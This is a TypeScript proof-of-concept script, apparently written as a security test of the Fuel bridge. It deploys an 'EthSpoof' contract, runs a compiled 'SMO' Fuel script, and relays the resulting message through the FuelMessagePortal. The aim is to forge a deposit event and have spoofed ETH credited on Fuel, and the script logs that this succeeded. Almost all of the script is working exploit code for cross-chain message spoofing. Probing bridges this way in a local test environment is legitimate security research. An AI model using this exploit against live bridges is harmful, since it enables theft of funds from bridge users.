import {
    setupEnvironment,
    ethers_parseToken,
    fuels_parseToken,
    fuels_parseEther,
    waitForMessage,
    relayCommonMessage,
    logETHBalances,
    logTokenBalances,
    createRelayMessageParams,
    deployEthSpoofContract,
    getOrDeployECR20Contract,
    mintECR20,
    getOrDeployL2Bridge,
    validateFundgibleContracts,
    getMessageOutReceipt,
    FUEL_MESSAGE_TIMEOUT_MS,
    FUEL_TX_PARAMS,
    waitForBlockCommit,
    waitForBlockFinalization,
    getTokenId,
    getBlock,
    FUEL_CALL_TX_PARAMS,
  } from '@fuel-bridge/test-utils'
  import type { TestEnvironment } from '@fuel-bridge/test-utils';
  import * as fs from 'fs';
  import { Address, BN, TransactionStatus ,
    AbstractAddress,
    Contract,
    Script,
    WalletUnlocked as FuelWallet,
    MessageProof,
  } from 'fuels';
  

  import { parseEther, ethers, BigNumberish, BytesLike } from 'ethers';





  import { default as smoABI } from '../../../smo/out/release/smo-abi.json';

  const _smoBinaryPath = '/workspaces/fuel-bridge/smo/out/release/smo.bin';

  // Alternatively, if you need to use it as a buffer synchronously
  const smoBinarybuffer = fs.readFileSync(_smoBinaryPath);
  console.log(smoBinarybuffer);
  


  
  const TOKEN_AMOUNT = '10';
  
  // This script is a demonstration of how ERC-20 tokens are bridged to and from the Fuel chain
  (async function spoofETH() {
    // basic setup routine which creates the connections (the "providers") to both chains,
    // funds addresses for us to test with and populates the official contract deployments
    // on the Ethereum chain for interacting with the Fuel chain
    console.log('Setting up environment...');
    const env: TestEnvironment = await setupEnvironment({});
    const ethAcct = env.eth.signers[0];
    const ethAcctAddr = await ethAcct.getAddress();
    const fuelAcct = env.fuel.signers[1];
    const fuelAcctAddr = fuelAcct.address.toHexString();
    const fuelMessagePortal = env.eth.fuelMessagePortal.connect(ethAcct);
    const eth_erc20Gateway = env.eth.fuelERC20Gateway.connect(ethAcct);

    const nnc = await fuelMessagePortal.getNextOutgoingMessageNonce();

    console.log(`Nounce: ${nnc}`);
    // ETHSpoof Ethereum Contract
    const ethSpoof = await deployEthSpoofContract(env);
    const ethSpoofAddress = await ethSpoof.getAddress();

    // padd for script call
    const ethSpoofAddressPadded = '0x' + ethSpoofAddress.slice(2).padStart(64, '0');
    const ethSpoofname = await ethSpoof.name();
    console.log(`${ethSpoofname} Contract: ${ethSpoofAddress}`);

  //   for (let i = 240; i < 270; i++) {
  //     // Convert the slot number to a hex string
  //     // Fetch the storage value at the specified slot
  //     const storageValue = await env.eth.deployer.provider.getStorage(fuelMessagePortal, i);
  //     console.log(`Storage at slot ${i}:`, storageValue);
  // }
    console.log(`fuelMessagePortal: ${await fuelMessagePortal.getAddress()}`);
    const storageSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
    const storageValue = await env.eth.deployer.provider.getStorage(fuelMessagePortal, storageSlot);
    console.log(`Storage at slot ${storageSlot}:`, storageValue);
    /////////////////////////////
  // Bridge Ethereum -> Fuel //
  /////////////////////////////

  const ETH_AMOUNT = '10';

  // note balances of both accounts before transfer
  await logETHBalances(ethAcct, fuelAcct);

  // use the FuelMessagePortal to directly send ETH to the fuel account
  console.log(`Sending ${ETH_AMOUNT} ETH from Ethereum...`);
  const eSendTx = await fuelMessagePortal.depositETH(fuelAcctAddr, {
    value: parseEther(ETH_AMOUNT),
  });
  const eSendTxResult = await eSendTx.wait();
  if (eSendTxResult.status !== 1) {
    console.log(eSendTxResult);
    throw new Error('failed to call depositETH');
  }

  // parse events from logs to get the message nonce
  const evnt = fuelMessagePortal.interface.parseLog(eSendTxResult.logs[0]);
  const depMessageNonce = new BN(evnt.args.nonce.toString());
  const depositRecipient = Address.fromB256(evnt.args.recipient);

  // wait for message to appear in fuel client
  console.log('Waiting for ETH to arrive on Fuel...');
  const depMessage = await waitForMessage(
    env.fuel.provider,
    depositRecipient,
    depMessageNonce,
    FUEL_MESSAGE_TIMEOUT_MS
  );
  if (depMessage == null) {
    throw new Error(
      `message took longer than ${FUEL_MESSAGE_TIMEOUT_MS}ms to arrive on Fuel`
    );
  }
  console.log('');

  // the sent ETH is now spendable on Fuel
  console.log('ETH was bridged to Fuel successfully!!');

  // note balances of both accounts after transfer
  await logETHBalances(ethAcct, fuelAcct);




    // SMO Fuel Script 
    const script = new Script(smoBinarybuffer, smoABI, fuelAcct);


    await logETHBalances(ethAcct, fuelAcct);

 
    // call Script with fuelAcctAddr as recepient
    const tx = script.functions
    .main(ethSpoofAddressPadded, fuelAcctAddr);
    // .callParams({forward:fuels_parseEther("100")});
    
    // Get the entire transaction request prior to
    const txRequest = await tx.getTransactionRequest();
    console.log(`txRequest: ${txRequest}`);
    
    // Get the transaction ID
    const txId = await tx.getTransactionId();
    console.log(`txId: ${txId}`);

    // Retrieve the value of the call and the actual gas used
    const smoTx = await tx.call();
    console.log(`value: ${smoTx}`);    
    
    
    const smoTxResult = smoTx.transactionResult;

    if (smoTxResult.status !== TransactionStatus.success) {
      console.log(smoTxResult);
      throw new Error("failed to run smo Script on Fuel");
    }

    // get message proof for relaying on Ethereum
    console.log("Building message proof...");
    const messageOutReceipt = getMessageOutReceipt(smoTxResult.receipts);

    //TODO: Add check for SMO receipt
    console.log("Waiting for block to be commited...");
    const withdrawBlock = await getBlock(
      env.fuel.provider.url,
      smoTxResult.blockId,
    );
    const commitHashAtL1 = await waitForBlockCommit(
      env,
      withdrawBlock.header.height,
    );

    console.log("Get message proof on Fuel...");
    const withdrawMessageProof = await fuelAcct.provider.getMessageProof(
      smoTxResult.id,
      messageOutReceipt.nonce,
      commitHashAtL1,
    );

    console.log(commitHashAtL1);
    console.dir(withdrawMessageProof, { depth: null });

    // wait for block finalization
    await waitForBlockFinalization(env, withdrawMessageProof);
    const relayMessageParams = createRelayMessageParams(withdrawMessageProof);

    console.log(`Relay Params: ${Object.keys(relayMessageParams)}`);

    // relay message on Ethereum
    console.log("Relaying SMO message on Ethereum...\n");
    const eRelayMessageTx = await fuelMessagePortal.relayMessage(
      relayMessageParams.message,
      relayMessageParams.rootBlockHeader,
      relayMessageParams.blockHeader,
      relayMessageParams.blockInHistoryProof,
      relayMessageParams.messageInBlockProof,
    );
    const eRelayMessageTxResult = await eRelayMessageTx.wait();
    if (eRelayMessageTxResult.status !== 1) {
      throw new Error("failed to call relayMessageFromFuelBlock");
    }


    console.log(`LOGS: ${eRelayMessageTxResult.logs.length}`);
    eRelayMessageTxResult.logs.forEach(log => {
      console.log(`Log Address: ${log.address}  => Topic: ${log.topics}`);
    });
    console.log(`fuelMessagePortal Address: ${await fuelMessagePortal.getAddress()}`);

    // parse events from logs
    const event = fuelMessagePortal.interface.parseLog(
      eRelayMessageTxResult.logs[0],
    );
    console.log(`log 1: ${event.args}`)
    const depositMessageNonce = new BN(event.args.nonce.toString());
    const fuelTokenMessageReceiver = Address.fromB256(event.args.recipient);

    //TODO: Check event Spoofed
    console.log("sendMessage event Spoofed Successfully!!");
    await logETHBalances(ethAcct, fuelAcct);

    /////////////////////////////
    // Bridge Ethereum -> Fuel //
    /////////////////////////////

    // wait for Spoof message to arrive on fuel
    console.log("Waiting for spooed message to arrive on Fuel...");
    const depositMessage = await waitForMessage(
      env.fuel.provider,
      fuelTokenMessageReceiver,
      depositMessageNonce,
      FUEL_MESSAGE_TIMEOUT_MS,
    );
    if (depositMessage == null)
      throw new Error(
        `message took longer than ${FUEL_MESSAGE_TIMEOUT_MS}ms to arrive on Fuel`,
      );

    // relay the message to the target contract
    console.log("Relaying spoofed message on Fuel...");
    const fMessageRelayTx = await relayCommonMessage(
      fuelAcct,
      depositMessage,
      FUEL_TX_PARAMS,
    );
    const fMessageRelayTxResult = await fMessageRelayTx.waitForResult();

    if (fMessageRelayTxResult.status !== TransactionStatus.success) {
      console.log(fMessageRelayTxResult.status);
      console.log(fMessageRelayTxResult);
      console.log(fMessageRelayTxResult.transaction.inputs);
      console.log(fMessageRelayTxResult.transaction.outputs);
      throw new Error("failed to relay message from gateway");
    }

    // the sent Tokens are now spendable on Fuel
    console.log("Spoofed ETH were bridged to Fuel successfully!!");

    // note balances of both accounts after spoof Relay x]
    await logETHBalances(ethAcct, fuelAcct);
  })();
 